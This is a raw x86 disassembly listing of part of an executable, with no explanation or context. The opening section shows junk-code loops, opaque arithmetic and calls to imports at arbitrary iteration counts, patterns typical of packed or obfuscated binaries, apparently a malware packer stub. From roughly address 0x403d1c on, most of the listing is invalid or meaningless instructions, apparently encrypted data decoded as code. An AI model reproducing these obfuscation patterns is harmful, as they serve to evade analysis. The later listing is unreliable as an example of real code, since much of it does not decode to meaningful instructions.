  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0xf76cd93],0xffffff85
  403d2b:	ja     0x403ce3
  403d2d:	adc    DWORD PTR [esi+0x7e],edi
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403d3a
  403d35:	sbb    dl,ah
  403d37:	adc    al,BYTE PTR [eax+0x71]
  403d3a:	mov    dh,0xc0
  403d3c:	dec    edx
  403d3d:	aaa    
  403d3e:	jl     0x403cf5
  403d40:	loop   0x403d2e
  403d42:	sbb    bh,BYTE PTR [edx]
  403d44:	add    al,0x5b
  403d46:	popa   
  403d47:	mov    DWORD PTR [eax-0x72],edi
  403d4a:	sub    eax,0x1dfca96d
  403d4f:	nop
  403d50:	push   edx
  403d51:	pop    esp
  403d52:	lds    edx,FWORD PTR [ecx+0x3f]
  403d55:	int    0x6e
  403d57:	and    edx,DWORD PTR [edx+0xa]
  403d5a:	or     eax,0x487ce432
  403d5f:	in     eax,0x8b
  403d61:	sbb    dl,BYTE PTR [eax+0x29]
  403d64:	fidiv  WORD PTR [esi]
  403d66:	cdq    
  403d67:	(bad)  [edi]
  403d69:	mov    ch,0xb8
  403d6b:	sbb    ebx,0xe0e7e4bc
  403d71:	imul   edi,eax,0xaf5cebe9
  403d77:	test   eax,0x255754d6
  403d7c:	bound  ebx,QWORD PTR [esi]
  403d7e:	fidivr DWORD PTR ds:0x78b49e88
  403d84:	push   0x106e99b9
  403d89:	sbb    DWORD PTR [ecx-0x30],ebx
  403d8c:	pop    ds
  403d8d:	sar    ch,1
  403d8f:	mov    ebp,esp
  403d91:	aaa    
  403d92:	jge    0x403d33
  403d94:	mov    al,0x2c
  403d96:	jle    0x403d54
  403d98:	jg     0x403e09
  403d9a:	xchg   ebx,eax
  403d9b:	jmp    0x3b45:0xf066f4bb
  403da2:	and    ebx,DWORD PTR [esi-0x5769ad6b]
  403da8:	cmc    
  403da9:	push   esp
  403daa:	jno    0x403dd2
  403dac:	cmc    
  403dad:	jmp    0x403d88
  403daf:	jb     0x403d60
  403db1:	push   cs
  403db2:	pop    ds
  403db3:	loop   0x403dab
  403db5:	repnz jmp 0x92e:0xc63a3ca9
  403dbd:	adc    al,0x43
  403dbf:	sbb    ebp,esi
  403dc1:	(bad)
  403dc5:	int    0xd0
  403dc7:	retf   
  403dc8:	(bad)  
  403dc9:	in     eax,0x0
  403dcb:	mov    eax,ds:0x16302929
  403dd0:	xor    al,0x3a
  403dd2:	mov    ds:0x756c2d13,eax
  403dd7:	call   0x8da0:0xd60687d0
  403dde:	jge    0x403e4a
  403de0:	test   DWORD PTR [eax-0x11],esp
  403de3:	in     eax,0xcb
  403de5:	cmp    BYTE PTR [ebx],cl
  403de7:	or     cl,BYTE PTR [edx-0x6b803edb]
  403ded:	xor    BYTE PTR es:[esi-0x58],0x77
  403df2:	mov    ds:0xf333fe44,al
  403df7:	pop    es
  403df8:	repnz stos DWORD PTR es:[edi],eax
  403dfa:	je     0x403dc0
  403dfc:	push   ds
  403dfd:	es nop
  403dff:	sbb    ebx,eax
  403e01:	xchg   ebp,eax
  403e02:	int    0xda
  403e04:	and    DWORD PTR [esp+ecx*4+0x7a3fc198],esp
  403e0b:	mov    eax,ds:0xffa17e39
  403e10:	in     eax,0xd9
  403e12:	xlat   BYTE PTR ds:[ebx]
  403e13:	push   esi
  403e14:	lods   eax,DWORD PTR ds:[esi]
  403e15:	sbb    DWORD PTR [ecx+0x59],eax
  403e18:	pop    edi
  403e19:	mov    edx,0xe02fb6ce
  403e1e:	mov    dh,0xc9
  403e20:	push   cs
  403e21:	dec    ecx
  403e22:	or     al,0x90
  403e24:	cld    
  403e25:	movlps QWORD PTR [ebx-0x4a],xmm4
  403e29:	(bad)  
  403e2a:	shr    BYTE PTR [ebp-0x5b],cl
  403e2d:	pop    es
  403e2e:	pop    edx
  403e2f:	in     eax,0xe1
  403e31:	and    eax,DWORD PTR [ecx-0x16]
  403e34:	inc    edi
  403e35:	(bad)  
  403e36:	gs dec bp
  403e39:	jno    0x403e75
  403e3b:	xor    al,0x87
  403e3d:	dec    edi
  403e3e:	sbb    ecx,DWORD PTR [edi]
  403e40:	sbb    eax,0xd1a1d334
  403e45:	call   0x1de2716b
  403e4a:	hlt    
  403e4b:	fcmovnbe st,st(4)
  403e4d:	aam    0x8f
  403e4f:	mov    ah,0xd2
  403e51:	in     eax,dx
  403e52:	sub    al,0xd4
  403e54:	aaa    
  403e55:	test   ebp,edi
  403e57:	mov    ah,BYTE PTR [edi+0x2c7a9977]
  403e5d:	push   eax
  403e5f:	jge    0x403e23
  403e61:	jno    0x403e84
  403e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e64:	adc    ecx,DWORD PTR [ebx+0x379b43a2]
  403e6a:	int    0xd8
  403e6c:	inc    edx
  403e6d:	aas    
  403e6e:	(bad)  
  403e6f:	push   0xffffffb3
  403e71:	pop    ebx
  403e72:	xor    eax,0x2c46bd14
  403e77:	or     dl,BYTE PTR [edi+0x6b]
  403e7a:	bound  esp,QWORD PTR [ebp-0x6]
  403e7d:	dec    eax
  403e7e:	(bad)  
  403e7f:	mov    al,0x6f
  403e81:	clc    
  403e82:	and    bh,cl
  403e84:	jp     0x403e13
  403e86:	repz mov ds:0xb7c5d43f,al
  403e8c:	outs   dx,DWORD PTR ds:[esi]
  403e8d:	test   DWORD PTR [esi+0x2db69f97],0x6162ee85
  403e97:	pushf  
  403e98:	pushf  
  403e99:	loop   0x403e56
  403e9b:	xor    ebx,DWORD PTR [esi]
  403e9d:	xor    dl,BYTE PTR [edx-0x435f6302]
  403ea3:	xor    ebx,DWORD PTR [ebp+0x6a]
  403ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ea8:	addr16 out 0x89,eax
  403eab:	xlat   BYTE PTR ds:[ebx]
  403eac:	mov    dh,0xbf
  403eae:	out    0x2f,eax
  403eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eb1:	(bad)
  403eb6:	and    eax,0x22c5382c
  403ebb:	sub    esp,DWORD PTR [edi]
  403ebd:	hlt    
  403ebe:	call   0x55cbe571
  403ec3:	fsubr  st,st(1)
  403ec5:	dec    edx
  403ec6:	pop    es
  403ec7:	add    BYTE PTR [eax],al
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x597278c4,al
  403efc:	mov    ds:0x13c3915e,eax
  403f01:	jle    0x403f81
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403ea7
  403f08:	daa    
  403f09:	es cmp al,0x78
  403f0c:	and    eax,DWORD PTR [edi+0x26e44faa]
  403f12:	ins    BYTE PTR es:[edi],dx
  403f13:	bound  ecx,QWORD PTR [eax+0x31]
  403f16:	cmp    dl,BYTE PTR [esi-0x6c591e7b]
  403f1c:	shl    BYTE PTR [edi],cl
  403f1e:	sub    ch,dl
  403f20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f21:	in     al,dx
  403f22:	popf   
  403f23:	jecxz  0x403f95
  403f25:	cmp    DWORD PTR [ecx+edi*2+0x32],edx
  403f29:	cmp    DWORD PTR [ebx-0x65],edx
  403f2c:	push   esp
  403f2d:	mov    ?,WORD PTR [edx-0x3ed8f689]
  403f33:	scas   al,BYTE PTR es:[edi]
  403f34:	jmp    0x403f87
  403f36:	test   eax,0xac82ab17
  403f3b:	mov    al,ds:0xab168f9f
  403f40:	ret    0xe290
  403f43:	loope  0x403f31
  403f45:	fidiv  WORD PTR [ecx]
  403f47:	jae    0x403fbc
  403f49:	inc    eax
  403f4a:	add    ch,BYTE PTR [edi-0x15]
  403f4d:	mov    al,0xc2
  403f4f:	jo     0x403ef7
  403f51:	imul   edx,DWORD PTR [ecx],0x27959b98
  403f57:	add    al,BYTE PTR ds:0xde859ce5
  403f5d:	test   eax,0x6eb93efe
  403f62:	and    BYTE PTR fs:[edx],bh
  403f65:	and    BYTE PTR [edx],dh
  403f67:	(bad)  
  403f68:	(bad)  
  403f6a:	ins    BYTE PTR es:[edi],dx
  403f6b:	in     al,0x35
  403f6d:	pop    esi
  403f6e:	clc    
  403f6f:	call   0xe7ca:0xf40e5cfa
  403f76:	jg     0x403f6d
  403f78:	outs   dx,BYTE PTR ds:[esi]
  403f79:	into   
  403f7a:	xchg   esi,eax
  403f7b:	rcr    BYTE PTR [eax-0x7cea4b09],cl
  403f81:	cmp    BYTE PTR [ecx+0x5b],ah
  403f84:	sub    eax,0x949e02ae
  403f89:	pop    ds
  403f8a:	and    BYTE PTR [edi-0x109115a8],ah
  403f90:	xchg   bl,al
  403f92:	mov    esi,0xb8c751b9
  403f97:	retf   0x94c8
  403f9a:	push   ss
  403f9b:	inc    ecx
  403f9c:	xchg   ecx,eax
  403f9d:	xchg   ebx,eax
  403f9e:	xchg   edx,eax
  403f9f:	adc    dl,ah
  403fa1:	daa    
  403fa2:	stos   DWORD PTR es:[edi],eax
  403fa3:	call   0xcd847c75
  403fa8:	dec    ebp
  403fa9:	in     al,0xc0
  403fab:	scas   al,BYTE PTR es:[edi]
  403fac:	adc    ebx,DWORD PTR ss:[eax+0x5c]
  403fb0:	xchg   ecx,eax
  403fb1:	or     ebx,DWORD PTR [edx]
  403fb3:	mov    BYTE PTR [esi+0x2f],bh
  403fb6:	sub    DWORD PTR [eax+0x23dd0d9c],ecx
  403fbc:	retw   0xd96e
  403fc0:	sbb    DWORD PTR [ecx-0x77],ecx
  403fc3:	enter  0x6548,0x62
  403fc7:	test   al,0xca
  403fc9:	fistp  WORD PTR [edx]
  403fcb:	xchg   edx,eax
  403fcc:	jne    0x403fb9
  403fce:	cwde   
  403fcf:	push   edi
  403fd0:	or     BYTE PTR [edx],cl
  403fd2:	push   ebp
  403fd3:	xor    eax,DWORD PTR [edx+eax*1+0x6459c083]
  403fda:	popf   
  403fdb:	imul   ebp,DWORD PTR [eax],0x7b
  403fde:	jl     0x403fb0
  403fe0:	jb     0x404021
  403fe2:	xor    eax,0x360129ac
  403fe7:	pop    edi
  403fe8:	in     al,0x53
  403fea:	push   edx
  403feb:	aas    
  403fec:	dec    edx
  403fed:	inc    dh
  403fef:	sbb    al,0xad
  403ff1:	sbb    al,0x6d
  403ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ff5:	jno    0x404005
  403ff7:	push   esi
  403ff8:	xchg   ebx,eax
  403ff9:	popf   
  403ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ffb:	popf   
  403ffc:	or     BYTE PTR [ebx+0x9],cl
  403fff:	and    eax,0xb0bff045
  404004:	and    BYTE PTR [edi+0x816381],ch
  40400a:	clc    
  40400b:	in     al,0x25
  40400d:	and    ah,BYTE PTR [esi+0x72]
  404010:	cs jae 0x404001
  404013:	dec    eax
  404014:	adc    DWORD PTR [esi],edi
  404016:	mov    esi,0x92671313
  40401b:	lahf   
  40401c:	stos   BYTE PTR es:[edi],al
  40401d:	push   edi
  40401e:	push   0xffffffe4
  404020:	je     0x404000
  404022:	arpl   WORD PTR [esi],sp
  404024:	dec    eax
  404025:	dec    ecx
  404026:	(bad)  
  404027:	out    0x2f,al
  404029:	xor    eax,0x7e68c9fb
  40402e:	jmp    0x1203:0xf3790c20
  404035:	rol    cl,0xdd
  404038:	dec    ecx
  404039:	fbstp  TBYTE PTR [eax]
  40403b:	dec    esp
  40403c:	fisttp WORD PTR [edi+0x6d]
  40403f:	dec    ebp
  404040:	call   0x48ec:0x87708765
  404047:	inc    eax
  404048:	cmp    BYTE PTR [edi+0x261abc4b],ch
  40404e:	ffree  st(6)
  404050:	(bad)  
  404051:	stos   DWORD PTR es:[edi],eax
  404052:	or     ch,dl
  404054:	lea    esi,[ecx+0x47935913]
  40405a:	mov    DWORD PTR [eax+eiz*1+0x32d91775],edx
  404061:	pop    ebp
  404062:	adc    eax,0x9447e022
  404067:	mov    eax,ds:0x726e7b9d
  40406c:	jmp    0x34f8d324
  404071:	pusha  
  404072:	sbb    DWORD PTR [esi-0x14],edi
  404075:	sbb    dh,BYTE PTR ds:0x8d9b1bbb
  40407b:	adc    BYTE PTR [edi],dl
  40407d:	cdq    
  40407e:	lods   eax,DWORD PTR ds:[esi]
  40407f:	ja     0x4040a4
  404081:	mov    ds:0x3695c5a0,eax
  404086:	jmp    0x4040c1
  404088:	cmp    ebx,esi
  40408a:	mov    dh,0x5c
  40408c:	push   es
  40408d:	iret   
  40408e:	pushf  
  40408f:	in     eax,dx
  404090:	mov    ebp,0x8b9dbc2a
  404095:	push   ebp
  404096:	aam    0xe9
  404098:	ja     0x40409f
  40409a:	add    BYTE PTR [eax],al
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0xd0bce6]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x404079
  4040c0:	add    ebx,esp
  4040c2:	stc    
  4040c3:	es fcmovnb st,st(2)
  4040c6:	jg     0x4040e6
  4040c8:	icebp  
  4040c9:	fistp  WORD PTR ds:0x49ab16bd
  4040cf:	addr16 mov edi,0x9badad12
  4040d5:	inc    ebp
  4040d6:	inc    edi
  4040d7:	cmp    cl,BYTE PTR ds:0x9c0efa2b
  4040dd:	fwait
  4040de:	mov    cl,0x5b
  4040e0:	test   al,0xc4
  4040e2:	push   edi
  4040e3:	dec    eax
  4040e4:	and    al,0xb6
  4040e6:	inc    cx
  4040e8:	sub    BYTE PTR [edx+0x50],ah
  4040eb:	inc    esi
  4040ec:	inc    ecx
  4040ed:	xchg   esp,eax
  4040ee:	and    DWORD PTR ds:[eax+ebx*1+0x65e96806],edx
  4040f6:	call   0xac8e68c
  4040fb:	dec    edx
  4040fc:	adc    al,0xd6
  4040fe:	mov    ah,0x88
  404100:	pop    ecx
  404101:	outs   dx,DWORD PTR ds:[esi]
  404102:	mov    WORD PTR ds:0xde12d04,es
  404108:	loop   0x4040d7
  40410a:	mov    edi,DWORD PTR [edx-0x5c9bc578]
  404110:	pop    ss
  404111:	sub    al,0x52
  404113:	jecxz  0x4040d7
  404115:	jno    0x40414a
  404117:	adc    esp,DWORD PTR es:[edi+0x54]
  40411b:	ret    
  40411c:	pop    esi
  40411d:	inc    edx
  40411e:	repnz push edx
  404120:	pop    es
  404121:	lahf   
  404122:	ret    0xe34e
  404125:	mov    DWORD PTR [ecx+ebp*2],ebp
  404128:	or     dh,BYTE PTR [edi+0x33]
  40412b:	or     BYTE PTR [esi+0x1c0c556e],0xeb
  404132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404133:	and    DWORD PTR [ecx],edx
  404135:	jne    0x404158
  404137:	add    al,0xc8
  404139:	sbb    al,0x59
  40413b:	jbe    0x404155
  40413d:	jae    0x404120
  40413f:	jge    0x4041b2
  404141:	les    ebp,FWORD PTR [esi]
  404143:	add    DWORD PTR [edi+0x716f19b2],edi
  404149:	cmp    esp,DWORD PTR [edi]
  40414b:	iret   
  40414c:	sbb    BYTE PTR [ebp+0x3dd94bf7],al
  404152:	jne    0x40414d
  404154:	adc    esi,eax
  404156:	mul    DWORD PTR [eax+0x2a]
  404159:	std    
  40415a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40415b:	(bad)  
  40415c:	xchg   ebx,eax
  40415d:	ja     0x404111
  40415f:	or     BYTE PTR [eax],0xec
  404162:	push   ebp
  404163:	test   dl,0x93
  404166:	aaa    
  404167:	setns  BYTE PTR [ebx+edi*8]
  40416b:	out    0x7c,eax
  40416d:	lahf   
  40416e:	jb     0x40418d
  404170:	mov    eax,0x9d3b7c09
  404175:	or     eax,0xd778f912
  40417a:	aad    0x1e
  40417c:	or     BYTE PTR [ecx+0x49],ah
  40417f:	test   eax,0x7e98f974
  404184:	or     eax,0x48e96c44
  404189:	test   BYTE PTR [edx],dl
  40418b:	adc    al,0x8b
  40418d:	inc    esi
  40418e:	mov    dl,0xdb
  404190:	and    ch,BYTE PTR [eax+esi*8+0x3c]
  404194:	sub    al,0xd
  404196:	xchg   edx,eax
  404197:	xchg   ebx,eax
  404198:	(bad)
  40419c:	mov    bh,0x78
  40419e:	(bad)  
  4041a1:	cmp    al,0xe0
  4041a3:	call   0x191c8082
  4041a8:	int3   
  4041a9:	cdq    
  4041aa:	icebp  
  4041ab:	test   DWORD PTR [ecx+ecx*1-0x23a35df9],0x7820e8a3
  4041b6:	mov    bh,0xd1
  4041b8:	mov    ah,BYTE PTR [esi]
  4041ba:	ss aaa 
  4041bc:	mov    ebx,0xff8fe553
  4041c1:	cmp    BYTE PTR [edx],cl
  4041c3:	aaa    
  4041c4:	ret    0x12b6
  4041c7:	fld    TBYTE PTR [esi]
  4041c9:	imul   BYTE PTR [esi+0x41839319]
  4041cf:	out    0x5a,al
  4041d1:	and    bl,BYTE PTR [edi+eax*1]
  4041d4:	inc    edi
  4041d5:	jno    0x4041cf
  4041d7:	es (bad) 
  4041d9:	aas    
  4041da:	std    
  4041db:	cdq    
  4041dc:	sbb    al,0x19
  4041de:	call   0xfb471c1c
  4041e3:	int    0xf9
  4041e5:	push   es
  4041e6:	add    ecx,DWORD PTR [eax-0x1e]
  4041e9:	xchg   ebx,eax
  4041ea:	fwait
  4041eb:	pop    es
  4041ec:	mov    eax,DWORD PTR [ecx]
  4041ee:	int    0x93
  4041f0:	icebp  
  4041f1:	inc    esi
  4041f2:	cmp    eax,0x7f3ca8d3
  4041f7:	jg     0x4041ae
  4041f9:	dec    esi
  4041fa:	mov    eax,esi
  4041fc:	jb     0x40423d
  4041fe:	mov    esi,0x25a4a08b
  404203:	add    al,0xe6
  404205:	or     ch,BYTE PTR [ebx]
  404207:	xor    DWORD PTR [esi],ebx
  404209:	jge    0x4041c1
  40420b:	and    DWORD PTR [edx+0x1d1fb366],esi
  404211:	jmp    0x404224
  404213:	add    esi,ecx
  404215:	sar    BYTE PTR [edx+0x11],0x5
  404219:	lea    esp,[esi-0x4bde1faf]
  40421f:	shl    DWORD PTR [edi-0x7785a746],1
  404225:	push   ebx
  404226:	cwde   
  404227:	xlat   BYTE PTR ds:[ebx]
